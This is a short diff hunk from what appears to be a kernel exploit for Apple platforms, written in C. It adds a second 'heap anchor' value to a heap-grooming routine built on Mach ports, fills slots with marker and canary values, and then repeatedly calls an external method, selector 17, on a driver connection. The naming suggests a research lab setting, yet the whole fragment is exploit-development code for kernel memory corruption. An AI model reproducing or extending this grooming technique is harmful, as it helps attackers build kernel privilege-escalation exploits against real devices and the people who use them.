@@ -300,6 +300,13 @@ static void p168_groom_free(mach_port_t *ports, int n) {
                     fields[1] = t ? id1 : 0xdead;
                     fields[2] = anchor ? anchor : 0x4141414141414141ull;
                     fields[3] = 0x43414e415259ull;
+                    {   /* 2026-11-19: groom slot 4 carries the SECOND anchor
+                           when the set has one — finer own-page ID */
+                        uint64_t a2 = 0;
+                        uint64_t set2[4] = {0};
+                        if (LabHeapAnchorsSameBoot(4, set2) > 1) a2 = set2[1];
+                        fields[4] = a2 ? a2 : 0xdeadbeefdeadbeefull;
+                    }
                     int nhits = 0; kern_return_t llast = 0xe00002c9;
                     for (int i = 0; i < 5; i++) {
                         p168_call(conn, 17, &reg, 1, wp);
